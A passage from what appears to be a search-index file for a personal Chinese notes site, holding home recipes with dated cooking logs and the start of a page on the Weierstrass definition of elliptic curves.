\u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c\u200b\u4e00\u76d2\u200b\u5185\u916f\u200b\u8c46\u8150\u200b\u548c\u200b\u4e24\u4e2a\u200b\u76ae\u86cb\u200b\uff0c\u200b\u5f88\u200b\u597d\u5403\u200b\uff0c\u200b\u5c31\u662f\u200b\u6599\u6c41\u200b\u8c03\u5f97\u200b\u4e0d\u591f\u200b\u597d\u200b\uff0c\u200b\u4e0b\u6b21\u200b\u6ce8\u610f\u200b</li> </ul>"},{"location":"cooking/pidandoufu.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u76ae\u86cb\u200b\u8c46\u8150\u200b\u597d\u5403\u200b\u79d8\u8bc0\u200b\u5c31\u662f\u200b\u6599\u6c41\u200b\uff0c\u200b\u5b66\u200b\u996d\u5e97\u200b\u7684\u200b\u5e38\u7528\u200b\u914d\u65b9\u200b\uff0c\u200b\u62cc\u200b\u4ec0\u4e48\u200b\u51c9\u83dc\u200b\u90fd\u200b\u597d\u5403\u200b</li> <li>\u200b\u51c9\u62cc\u200b\u76ae\u86cb\u200b\u8c46\u8150\u200b\uff0c\u200b\u597d\u591a\u200b\u4eba\u200b\u90fd\u200b\u505a\u200b\u9519\u200b\u4e86\u200b\uff0c\u200b\u96be\u602a\u200b\u4e0d\u200b\u597d\u5403\u200b\uff0c\u200b\u770b\u200b\u996d\u5e97\u200b\u5927\u53a8\u200b\u5982\u4f55\u200b\u505a\u200b\u7684\u200b</li> </ul>"},{"location":"cooking/qiezichaorou.html","title":"\u8304\u5b50\u200b\u7092\u8089","text":""},{"location":"cooking/qiezichaorou.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u8304\u5b50\u200b \u200b\u732a\u8089\u200b\u6216\u200b\u9e21\u8089\u200b</p>"},{"location":"cooking/qiezichaorou.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u8089\u200b\u5207\u7247\u200b\u6216\u5207\u200b\u4e01\u200b\uff0c\u200b\u8304\u5b50\u200b\u5207\u6210\u200b\u51e0\u5398\u7c73\u200b\u957f\u200b\u7684\u200b\u6761\u200b</li> <li>\u200b\u7ed9\u200b\u8304\u5b50\u200b\u4e0b\u76d0\u200b\uff0c\u200b\u814c\u5236\u200b\u5341\u5206\u949f\u200b\uff0c\u200b\u518d\u200b\u7528\u6c34\u200b\u6e05\u6d17\u200b\u5e72\u51c0\u200b\uff0c\u200b\u518d\u200b\u7528\u529b\u200b\u628a\u200b\u6c34\u200b\u6525\u200b\u5e72\u200b\uff0c\u200b\u8fd9\u6837\u200b\u8304\u5b50\u200b\u624d\u200b\u4e0d\u4f1a\u200b\u5438\u6cb9\u200b</li> <li>\u200b\u5148\u200b\u7092\u200b\u8089\u200b\uff0c\u200b\u518d\u200b\u7092\u200b\u8304\u5b50\u200b\uff0c\u200b\u89c6\u200b\u60c5\u51b5\u200b\u52a0\u200b\u8c03\u5473\u6599\u200b</li> </ol>"},{"location":"cooking/qiezichaorou.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-20: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c300g \u200b\u8304\u5b50\u200b\u52a0\u200b 150g \u200b\u9e21\u817f\u8089\u200b\uff0c\u200b\u8304\u5b50\u200b\u770b\u8d77\u6765\u200b\u5f88\u591a\u200b\uff0c\u200b\u5b9e\u9645\u200b\u7092\u200b\u5b8c\u200b\u4ee5\u540e\u200b\u7f29\u6c34\u200b\u4e86\u200b\u5f88\u591a\u200b\uff1b\u200b\u524d\u671f\u200b\u7528\u200b\u76d0\u200b\u5904\u7406\u200b\u8304\u5b50\u200b\u7684\u200b\u65f6\u95f4\u200b\u4e0d\u591f\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u7092\u200b\u7684\u200b\u65f6\u5019\u200b\u8fd8\u662f\u200b\u5438\u200b\u4e86\u200b\u6cb9\u200b\uff0c\u200b\u4e4b\u540e\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b</li> </ul>"},{"location":"cooking/qiezichaorou.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u4e0d\u200b\u4e00\u6837\u200b\u7684\u200b\u8304\u5b50\u200b\u7092\u8089\u200b\uff0c\u200b\u9999\u200b\u7684\u200b\u8981\u547d\u200b</li> </ul>"},{"location":"cooking/suanlachaodouya.html","title":"\u9178\u8fa3\u200b\u7092\u200b\u8c46\u82bd","text":""},{"location":"cooking/suanlachaodouya.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u7eff\u8c46\u82bd\u200b</p>"},{"location":"cooking/suanlachaodouya.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u6e05\u6d17\u200b\u8c46\u82bd\u200b\uff0c\u200b\u628a\u200b\u6c34\u6ca5\u5e72\u200b</li> <li>\u200b\u4e0b\u9505\u200b\u5148\u200b\u628a\u200b\u8fa3\u6912\u200b\u7b49\u200b\u8c03\u5473\u6599\u200b\u7206\u9999\u200b\uff0c\u200b\u6ce8\u610f\u200b\u8fa3\u6912\u200b\u4e0d\u8981\u200b\u653e\u592a\u591a\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u8fa3\u5473\u200b\u538b\u200b\u8fc7\u200b\u9178\u5473\u200b</li> <li>\u200b\u8c46\u82bd\u200b\u4e0b\u9505\u200b\uff0c\u200b\u5c3d\u91cf\u200b\u628a\u200b\u8c46\u82bd\u200b\u5e73\u94fa\u200b\u5728\u200b\u9505\u200b\u4e2d\u200b\uff0c\u200b\u6301\u7eed\u200b\u7ffb\u7092\u200b\uff0c\u200b\u706b\u200b\u53ef\u4ee5\u200b\u5c0f\u200b\u4e00\u4e9b\u200b</li> <li>\u200b\u4e0b\u76d0\u200b\uff0c\u200b\u751f\u62bd\u200b\uff0c\u200b\u918b\u200b\uff08\u200b\u767d\u918b\u200b + \u200b\u9648\u918b\u200b\uff09\uff0c\u200b\u6301\u7eed\u200b\u7ffb\u7092\u200b\uff0c\u200b\u4e0d\u200b\u51fa\u200b\u6c64\u6c34\u200b\u6bd4\u8f83\u200b\u597d\u200b\uff0c\u200b\u4e0d\u7528\u200b\u7092\u592a\u900f\u200b</li> </ol>"},{"location":"cooking/suanlachaodouya.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-27: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c300g \u200b\u7eff\u8c46\u82bd\u200b\u52a0\u200b\u4e00\u6839\u200b\u5c0f\u7c73\u200b\u8fa3\u200b\uff0c\u200b\u8fa3\u5473\u200b\u592a\u5927\u200b\u4e86\u200b\uff0c\u200b\u5e94\u8be5\u200b\u53ea\u200b\u9700\u8981\u200b\u534a\u6839\u200b\uff0c\u200b\u6b64\u5916\u200b\u918b\u200b\u53ef\u4ee5\u200b\u591a\u653e\u200b\u4e00\u4e9b\u200b</li> </ul>"},{"location":"cooking/suanlachaodouya.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u7092\u200b\u8c46\u82bd\u200b\u4e0d\u200b\u51fa\u6c34\u200b\u624d\u200b\u53eb\u200b\u6b63\u5b97\u200b\uff0c\u200b\u8001\u53a8\u200b\u6559\u200b\u4f60\u200b\u5bb6\u5e38\u200b\u7206\u7092\u200b\u7edd\u62db\u200b\uff0c\u200b\u770b\u4f3c\u200b\u7b80\u5355\u200b\u6280\u5de7\u200b\u771f\u200b\u591a\u200b</li> </ul>"},{"location":"cooking/suanlatudousi.html","title":"\u9178\u8fa3\u200b\u571f\u8c46\u4e1d","text":""},{"location":"cooking/suanlatudousi.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u571f\u8c46\u200b</p>"},{"location":"cooking/suanlatudousi.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u571f\u8c46\u200b\u5207\u6210\u200b 3mm \u200b\u5de6\u53f3\u200b\u539a\u200b\u7684\u200b\u7ec6\u4e1d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u64e6\u200b\u4e1d\u5668\u200b\uff0c\u200b\u91cd\u590d\u200b\u6d17\u200b\u591a\u6b21\u200b\uff0c\u200b\u628a\u200b\u6dc0\u7c89\u200b\u6d17\u6389\u200b</li> <li>\u200b\u4e0b\u9505\u200b\u5148\u200b\u628a\u200b\u8fa3\u6912\u200b\u7b49\u200b\u8c03\u5473\u6599\u200b\u7206\u9999\u200b\uff0c\u200b\u6ce8\u610f\u200b\u8fa3\u6912\u200b\u4e0d\u8981\u200b\u653e\u592a\u591a\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u8fa3\u5473\u200b\u538b\u200b\u8fc7\u200b\u9178\u5473\u200b</li> <li>\u200b\u571f\u8c46\u200b\u4e0b\u9505\u200b\uff0c\u200b\u6301\u7eed\u200b\u7ffb\u7092\u200b\uff0c\u200b\u4e0b\u76d0\u200b\uff0c\u200b\u751f\u62bd\u200b\uff0c\u200b\u918b\u200b\uff08\u200b\u767d\u918b\u200b + \u200b\u9648\u918b\u200b\uff09\uff0c\u200b\u6301\u7eed\u200b\u7ffb\u7092\u200b</li> </ol>"},{"location":"cooking/suanlatudousi.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-28: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c500g \u200b\u571f\u8c46\u200b\u52a0\u200b\u534a\u6839\u200b\u5c0f\u7c73\u200b\u8fa3\u200b\uff0c\u200b\u8fa3\u5473\u200b\u6de1\u200b\u4e86\u200b\u70b9\u200b\uff0c\u200b\u6b64\u5916\u200b\u9178\u5473\u200b\u6709\u70b9\u200b\u4e0d\u8db3\u200b\uff0c\u200b\u53ef\u80fd\u200b\u662f\u200b\u9648\u918b\u200b\u653e\u200b\u7684\u200b\u4e0d\u591f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u52a0\u200b\u9178\u5473\u200b\u6bd4\u8f83\u200b\u6d53\u200b\u7684\u200b\u767d\u918b\u200b</li> </ul>"},{"location":"cooking/suanlatudousi.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u9178\u8fa3\u200b\u571f\u8c46\u4e1d\u200b\uff0c\u200b\u4e3a\u4ec0\u4e48\u200b\u81ea\u5df1\u200b\u7092\u4e0d\u9999\u200b\u4e0d\u8106\u200b\u8fd8\u200b\u7c98\u9505\u200b\uff1f\u200b\u539f\u6765\u200b\u4ece\u5207\u200b\u5230\u200b\u7092\u200b\u5168\u662f\u200b\u6280\u5de7\u200b</li> </ul>"},{"location":"cooking/suanrongchaokongxincai.html","title":"\u849c\u84c9\u200b\u7092\u200b\u7a7a\u5fc3\u83dc","text":""},{"location":"cooking/suanrongchaokongxincai.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u7a7a\u5fc3\u83dc\u200b \u200b\u849c\u200b\uff08\u200b\u5efa\u8bae\u200b\u591a\u653e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u52a0\u200b\u849c\u84c9\u200b\u9171\u200b\uff09</p>"},{"location":"cooking/suanrongchaokongxincai.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u7a7a\u5fc3\u83dc\u200b\u6d17\u51c0\u200b\uff0c\u200b\u6897\u200b\u548c\u200b\u53f6\u5b50\u200b\u5206\u5f00\u200b\uff0c\u200b\u6897\u200b\u53ef\u4ee5\u200b\u62cd\u6241\u200b\u65b9\u4fbf\u200b\u716e\u719f\u200b\uff0c\u200b\u90fd\u200b\u5207\u6210\u200b 5cm \u200b\u7684\u200b\u5c0f\u6bb5\u200b</li> <li>\u200b\u4e0b\u9505\u200b\u5bf9\u200b\u7a7a\u5fc3\u83dc\u200b\u6897\u6897\u712f\u200b\u6c34\u200b\uff0c\u200b\u635e\u51fa\u200b</li> <li>\u200b\u4e0b\u6cb9\u200b\u628a\u200b\u849c\u84c9\u200b\u7092\u9999\u200b\uff0c\u200b\u518d\u4e0b\u200b\u7a7a\u5fc3\u83dc\u200b\uff0c\u200b\u8c03\u5473\u200b</li> </ol>"},{"location":"cooking/suanrongchaokongxincai.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-08: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c\u200b\u849c\u84c9\u200b\u653e\u200b\u7684\u200b\u4e0d\u591f\u200b\u591a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8865\u200b\u4e86\u200b\u849c\u84c9\u200b\u9171\u200b\uff0c\u200b\u7a7a\u5fc3\u83dc\u200b\u7684\u200b\u6897\u90e8\u200b\u6ca1\u6709\u200b\u62cd\u6241\u200b\uff0c\u200b\u4e0d\u591f\u200b\u723d\u8106\u200b</li> </ul>"},{"location":"cooking/suanrongchaokongxincai.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u9752\u83dc\u200b\u600e\u4e48\u200b\u7092\u200b\u7fe0\u7eff\u200b\u53c8\u200b\u6e05\u723d\u200b\uff1f\u200b\u5b66\u4f1a\u200b\u8fd9\u9053\u200b\u849c\u84c9\u200b\u7092\u200b\u7a7a\u5fc3\u83dc\u200b\uff0c\u200b\u505a\u200b\u4ec0\u4e48\u200b\u9752\u83dc\u200b\u90fd\u200b\u597d\u5403\u200b</li> </ul>"},{"location":"cooking/suanrongfensizhengdaxia.html","title":"\u849c\u84c9\u200b\u7c89\u4e1d\u200b\u84b8\u200b\u5927\u867e","text":""},{"location":"cooking/suanrongfensizhengdaxia.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u6d3b\u867e\u200b \u200b\u7c89\u4e1d\u200b \u200b\u59dc\u200b \u200b\u8471\u200b \u200b\u849c\u84c9\u200b</p>"},{"location":"cooking/suanrongfensizhengdaxia.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u628a\u200b\u6d3b\u867e\u200b\u6e05\u6d17\u200b\u5e72\u51c0\u200b\uff0c\u200b\u53bb\u6389\u200b\u867e\u67aa\u200b\u548c\u200b\u867e\u200b\u811a\u200b\uff0c\u200b\u5bf9\u534a\u200b\u5207\u5f00\u200b\u7559\u200b\u4e24\u8282\u200b\uff0c\u200b\u638f\u200b\u5185\u810f\u200b\u548c\u200b\u867e\u7ebf\u200b</li> <li>\u200b\u70ed\u200b\u6c34\u6ce1\u200b\u8f6f\u200b\u7c89\u4e1d\u200b\uff0c\u200b\u526a\u6210\u200b\u5c0f\u200b\u6bb5\u200b\uff0c\u200b\u52a0\u200b\u751f\u62bd\u200b\u548c\u200b\u869d\u6cb9\u200b\uff0c\u200b\u88c5\u789f\u200b\u94fa\u5e73\u200b</li> <li>\u200b\u5207\u597d\u200b\u7684\u200b\u867e\u200b\u94fa\u200b\u5728\u200b\u7c89\u4e1d\u200b\u4e0a\u9762\u200b</li> <li>\u200b\u628a\u200b\u59dc\u8471\u200b\u5207\u788e\u200b\uff0c\u200b\u52a0\u200b\u849c\u84c9\u200b\uff0c\u200b\u6dcb\u200b\u70ed\u6cb9\u200b\uff0c\u200b\u653e\u76d0\u200b\u3001\u200b\u767d\u7cd6\u200b\u3001\u200b\u80e1\u6912\u7c89\u200b\u3001\u200b\u751f\u62bd\u200b\u3001\u200b\u869d\u6cb9\u200b\uff0c\u200b\u52a0\u70b8\u200b\u849c\u84c9\u200b</li> <li>\u200b\u8c03\u5473\u6599\u200b\u6dcb\u5230\u200b\u867e\u200b\u4e0a\u200b\uff0c\u200b\u9505\u91cc\u200b\u70e7\u6c34\u200b\uff0c\u200b\u6c34\u5f00\u200b\u540e\u200b\u653e\u5165\u200b\u789f\u200b\uff0c\u200b\u8f6c\u200b\u5927\u706b\u200b\u84b8\u200b\u4e94\u5206\u949f\u200b\u51fa\u9505\u200b\uff0c\u200b\u6492\u200b\u8471\u82b1\u200b\uff0c\u200b\u6d47\u200b\u70ed\u6cb9\u200b</li> </ol>"},{"location":"cooking/suanrongfensizhengdaxia.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-01: \u200b\u597d\u5403\u200b\uff0c\u200b\u4e0d\u96be\u200b\uff0c\u200b\u5c31\u662f\u200b\u524d\u671f\u200b\u5904\u7406\u200b\u6709\u200b\u4e00\u4e9b\u200b\u8d39\u52b2\u200b\u3002\u200b\u8c03\u6599\u200b\u53ef\u4ee5\u200b\u91cd\u200b\u4e00\u4e9b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u849c\u84c9\u200b\u9171\u200b</li> </ul>"},{"location":"cooking/suanrongfensizhengdaxia.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u849c\u84c9\u200b\u7c89\u4e1d\u200b\u84b8\u200b\u5927\u867e\u200b\u7684\u200b\u505a\u6cd5\u200b\uff0c\u200b\u5f00\u76d6\u200b\u9999\u6c14\u6251\u9f3b\u200b\uff0c\u200b\u9c9c\u5ae9\u200b\u723d\u6ed1\u200b\uff0c\u200b\u592a\u200b\u597d\u5403\u200b\u4e86\u200b</li> <li>\u3010\u200b\u849c\u84c9\u200b\u7c89\u4e1d\u200b\u5f00\u80cc\u200b\u867e\u200b\u3011\u200b\u597d\u5403\u200b\u53c8\u200b\u597d\u200b\u505a\u200b\uff01\u200b\u6d77\u9c9c\u200b\u7edd\u914d\u200b\u7684\u200b\u91d1\u94f6\u200b\u849c\u84c9\u200b\u4e00\u5e76\u200b\u5206\u4eab\u200b\u7ed9\u200b\u5927\u5bb6\u200b\uff01</li> <li>\u200b\u968b\u200b\u535e\u200b\u4e00\u200b\u505a\u200b |\u200b\u7279\u7ea7\u200b\u53a8\u5e08\u200b\u7684\u200b\u849c\u84c9\u200b\u7c89\u4e1d\u200b\u867e\u200b\u505a\u6cd5\u200b\uff01</li> </ul>"},{"location":"cooking/xiangchunjiandan.html","title":"\u9999\u693f\u200b\u714e\u86cb","text":""},{"location":"cooking/xiangchunjiandan.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u9999\u693f\u200b \u200b\u9e21\u86cb\u200b 1:1\uff08150g \u200b\u9999\u693f\u200b\u5bf9\u200b 6 \u200b\u4e2a\u200b\u9e21\u86cb\u200b\uff09</p>"},{"location":"cooking/xiangchunjiandan.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u6e05\u6d17\u200b\u9999\u693f\u200b\uff0c\u200b\u4e0b\u200b\u5230\u200b\u5f00\u6c34\u200b\u4e2d\u712f\u200b\u6c34\u200b\uff0c\u200b\u52a0\u76d0\u200b\u548c\u200b\u6cb9\u200b</li> <li>\u200b\u635e\u51fa\u200b\u9999\u693f\u200b\uff0c\u200b\u8fc7\u51b7\u200b\u6cb3\u200b\uff0c\u200b\u635e\u51fa\u200b\u6324\u5e72\u200b\u6c34\u5206\u200b</li> <li>\u200b\u53bb\u6389\u200b\u6839\u90e8\u200b\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u90e8\u5206\u200b\u5207\u788e\u200b\u5907\u7528\u200b\uff0c\u200b\u5207\u7ec6\u200b\u53e3\u611f\u200b\u66f4\u597d\u200b</li> <li>\u200b\u628a\u200b\u9e21\u86cb\u200b\u6253\u5165\u200b\u5207\u788e\u200b\u7684\u200b\u9999\u693f\u200b\uff0c\u200b\u6405\u62cc\u200b\uff0c\u200b\u52a0\u200b\u98df\u7528\u76d0\u200b\uff0c\u200b\u8471\u200b\u53ef\u9009\u200b</li> <li>\u200b\u5c0f\u706b\u200b\u714e\u200b\u9999\u693f\u200b\u86cb\u6db2\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5148\u653e\u200b\u4e00\u534a\u200b\u518d\u653e\u200b\u5269\u4e0b\u200b\u7684\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b\u8981\u200b\u505a\u6210\u200b\u997c\u200b\uff0c\u200b\u5c3d\u91cf\u200b\u5e73\u6574\u200b\uff0c\u200b\u5b8c\u6574\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5c0f\u5757\u200b\u53bb\u200b\u7092\u200b</li> </ol>"},{"location":"cooking/xiangchunjiandan.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-07: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c\u200b\u9999\u693f\u200b\u5207\u5f97\u200b\u4e0d\u591f\u200b\u7ec6\u200b\uff0c\u200b\u4f1a\u200b\u5f71\u54cd\u200b\u53e3\u611f\u200b\u548c\u200b\u7f8e\u89c2\u200b\uff0c\u200b\u53e6\u5916\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u66f4\u597d\u200b\u7684\u200b\u7f8e\u89c2\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u4e00\u4e0b\u200b\u600e\u4e48\u200b\u628a\u200b\u9999\u693f\u200b\u9e21\u86cb\u200b\u997c\u200b\u505a\u200b\u7684\u200b\u66f4\u200b\u5e73\u6574\u200b\uff0c\u200b\u6216\u8005\u200b\u76f4\u63a5\u200b\u4e0d\u200b\u8ffd\u6c42\u200b\u5e73\u6574\u200b\uff0c\u200b\u76f4\u63a5\u200b\u7092\u6210\u200b\u7c7b\u4f3c\u200b\u6ed1\u86cb\u200b\u7684\u200b\u6837\u5b50\u200b\uff1b\u200b\u53e6\u5916\u200b\u9e21\u86cb\u200b\u8981\u200b\u820d\u5f97\u200b\u4e0b\u200b\uff0c\u200b\u4e0d\u8981\u200b\u8ba9\u200b\u9999\u693f\u200b\u5360\u592a\u5927\u200b\u6bd4\u4f8b\u200b</li> </ul>"},{"location":"cooking/xiangchunjiandan.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u53a8\u5e08\u957f\u200b\u6559\u200b\u4f60\u200b\uff1a\u201c\u200b\u9999\u693f\u200b\u714e\u86cb\u200b\u201d\u200b\u7684\u200b\u5bb6\u5e38\u200b\u505a\u6cd5\u200b\uff0c\u200b\u693f\u82bd\u200b\u9c9c\u5ae9\u200b\uff0c\u200b\u86cb\u9999\u200b\u6d53\u90c1\u200b</li> <li>\u200b\u9999\u693f\u200b\u7092\u9e21\u86cb\u200b\u8fd9\u4e48\u200b\u505a\u200b\u624d\u200b\u6b63\u786e\u200b\uff0c\u200b\u9152\u5e97\u200b\u5927\u53a8\u200b\u6559\u200b\u4f60\u200b\u4e00\u62db\u200b\u641e\u5b9a\u200b\uff0c\u200b\u9e21\u86cb\u200b\u9c9c\u5ae9\u200b\u4e0d\u200b\u53d1\u9ed1\u200b</li> </ul>"},{"location":"cooking/xiangguchaoqingcai.html","title":"\u9999\u83c7\u200b\u7092\u9752\u83dc","text":""},{"location":"cooking/xiangguchaoqingcai.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u9999\u83c7\u200b \u200b\u4e0a\u6d77\u200b\u9752\u200b</p>"},{"location":"cooking/xiangguchaoqingcai.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u5982\u679c\u200b\u662f\u200b\u5e72\u200b\u9999\u83c7\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u6ce1\u200b\u53d1\u200b</li> <li>\u200b\u9999\u83c7\u200b\u5207\u7247\u200b\uff0c\u200b\u4e0a\u6d77\u200b\u9752\u200b\u5207\u5757\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u6897\u200b\u548c\u200b\u53f6\u200b\u5206\u5f00\u200b</li> <li>\u200b\u4e0b\u9505\u200b\u5148\u200b\u7092\u200b\u9999\u83c7\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5148\u200b\u7092\u200b\u849c\u84c9\u200b\u8c03\u5473\u200b</li> <li>\u200b\u540e\u200b\u7092\u9752\u83dc\u200b\uff0c\u200b\u5982\u679c\u200b\u6897\u200b\u548c\u200b\u53f6\u200b\u5206\u5f00\u200b\uff0c\u200b\u5c31\u200b\u5148\u4e0b\u200b\u6897\u200b\u540e\u200b\u4e0b\u53f6\u200b</li> <li>\u200b\u8c03\u5473\u200b\uff0c\u200b\u52a0\u76d0\u200b\uff0c\u200b\u751f\u62bd\u200b\u6216\u200b\u869d\u6cb9\u200b</li> </ol>"},{"location":"cooking/xiangguchaoqingcai.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-03-12: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c\u200b\u597d\u5403\u200b\uff0c\u200b\u5473\u9053\u200b\u53ef\u4ee5\u200b\u518d\u91cd\u200b\u4e00\u4e9b\u200b\uff0c\u200b\u8003\u8651\u200b\u6309\u7167\u200b\u83dc\u8c31\u200b\u52a0\u200b\u4e00\u4e9b\u200b\u849c\u200b</li> </ul>"},{"location":"cooking/xiangguchaoqingcai.html#_5","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u9999\u83c7\u200b\u7092\u9752\u83dc\u200b\u600e\u4e48\u200b\u505a\u200b\u597d\u5403\u200b\uff0c\u200b\u5927\u53a8\u200b\u6559\u200b\u4f60\u200b\u5bb6\u5e38\u200b\u505a\u6cd5\u200b\uff0c\u200b\u6e05\u6de1\u200b\u8425\u517b\u200b\uff0c\u200b\u597d\u5403\u200b\u53c8\u200b\u4e0b\u996d\u200b</li> </ul>"},{"location":"cooking/xihongshichaojidan.html","title":"\u897f\u7ea2\u67ff\u200b\u7092\u9e21\u86cb","text":""},{"location":"cooking/xihongshichaojidan.html#_2","title":"\u98df\u6750","text":"<p>\u200b\u897f\u7ea2\u67ff\u200b \u200b\u9e21\u86cb\u200b \u200b\u756a\u8304\u9171\u200b</p>"},{"location":"cooking/xihongshichaojidan.html#_3","title":"\u6b65\u9aa4","text":"<ol> <li>\u200b\u6e05\u6d17\u200b\u897f\u7ea2\u67ff\u200b\uff0c\u200b\u53ef\u200b\u9009\u200b\u5265\u76ae\u200b\uff0c\u200b\u5207\u6210\u200b\u5c0f\u200b\u5757\u200b</li> <li>\u200b\u714e\u200b\u9e21\u86cb\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b \u200b\u714e\u86cb\u200b \u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u6839\u636e\u200b\u53e3\u5473\u200b\u9009\u62e9\u200b\u505a\u6cd5\u200b</li> <li>\u200b\u714e\u200b\u597d\u200b\u9e21\u86cb\u200b\u540e\u200b\u628a\u200b\u9e21\u86cb\u200b\u53d6\u51fa\u200b\uff0c\u200b\u5207\u6210\u200b\u5c0f\u200b\u7247\u200b</li> <li>\u200b\u4e0b\u5207\u200b\u597d\u200b\u7684\u200b\u897f\u7ea2\u67ff\u200b\u7ffb\u7092\u200b\uff0c\u200b\u540e\u200b\u518d\u200b\u52a0\u5165\u200b\u9e21\u86cb\u200b\uff0c\u200b\u52a0\u200b\u756a\u8304\u9171\u200b\u8c03\u5473\u200b</li> </ol>"},{"location":"cooking/xihongshichaojidan.html#_4","title":"\u8bb0\u5f55","text":"<ul> <li>2025-04-15: \u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\uff0c200g \u200b\u9e21\u86cb\u200b\u52a0\u200b 300g \u200b\u4e2a\u5934\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u7684\u200b\u6c34\u679c\u200b\u756a\u8304\u200b\uff0c\u200b\u4e0d\u597d\u200b\u5265\u76ae\u200b\uff0c\u200b\u5077\u61d2\u200b\u6ca1\u6709\u200b\u6309\u7167\u200b\u89c6\u9891\u200b\u91cc\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5207\u5f00\u200b\u76ae\u200b\u518d\u200b\u70ed\u6c34\u200b\u716e\u200b\u518d\u200b\u6495\u76ae\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u5e26\u200b\u7740\u200b\u4e00\u70b9\u200b\u76ae\u200b\u53e3\u611f\u200b\u4e5f\u200b\u8fd8\u884c\u200b\uff0c\u200b\u53ef\u80fd\u200b\u548c\u200b\u54c1\u79cd\u200b\u6709\u5173\u200b\uff1b\u200b\u52a0\u200b\u4e86\u200b\u756a\u8304\u9171\u200b\uff0c\u200b\u5473\u9053\u200b\u66f4\u597d\u200b\u4e00\u4e9b\u200b</li> </ul>"},{"location":"cooking/xihongshichaojidan.html#_5","title":"\u53c2\u8003","text":"<ul> <li>40 \u200b\u5e74\u8001\u200b\u53a8\u505a\u200b\u897f\u7ea2\u67ff\u200b\u7092\u9e21\u86cb\u200b\uff0c\u200b\u5473\u9053\u200b\u771f\u7684\u200b\u4e0d\u200b\u4e00\u822c\u200b\uff0c\u200b\u4e0d\u200b\u52a0\u200b\u756a\u8304\u9171\u200b\u597d\u5403\u200b\u6709\u200b\u79d8\u8bc0\u200b</li> </ul>"},{"location":"cryptography/ec.html","title":"\u692d\u5706\u200b\u66f2\u7ebf","text":""},{"location":"cryptography/ec.html#weierstrass","title":"Weierstrass \u200b\u5b9a\u4e49","text":"<p>\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9a\u4e49\u200b\u662f\u200b\uff0c\u200b\u5728\u200b \\(\\mathbb{R}^2\\) \u200b\u4e0a\u200b\u7684\u200b\u66f2\u7ebf\u200b\uff0c\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u6bcf\u200b\u4e00\u70b9\u200b \\((x, y)\\) \u200b\u6ee1\u8db3\u200b\uff1a</p> \\[ y^2 = x^3 + ax + b \\] <p>\u200b\u8981\u6c42\u200b \\(4a^3 + 27b^2 \\ne 0\\)\uff0c\u200b\u8fd9\u79cd\u200b\u5f62\u5f0f\u200b\u53eb\u505a\u200b Weierstrass 